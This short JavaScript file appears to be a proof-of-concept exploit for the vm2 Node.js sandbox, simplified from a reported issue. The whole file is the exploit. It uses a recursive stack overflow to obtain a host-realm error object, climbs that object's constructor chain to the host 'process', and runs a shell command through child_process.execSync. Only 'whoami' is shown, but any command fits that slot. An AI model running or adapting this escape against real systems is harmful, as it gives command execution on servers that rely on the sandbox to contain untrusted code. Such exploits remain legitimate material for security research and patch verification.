// simplified version of https://github.com/patriksimek/vm2/issues/197
const f = Buffer.prototype.write;
const ft = {
		length: 10,
		utf8Write(){			
		}
}
function r(i){
	let x = 0;
	try{
		x = r(i);
	}catch(e){}	
	if(typeof(x) !== 'number')
		return x;	
	if(x !== i)
		return x+1;
	try{
		f.call(ft);
	}catch(e){		
		return e;
	}	
}

let e = r(7).constructor.constructor("return process")();		

e.mainModule.require("child_process").execSync("whoami").toString()
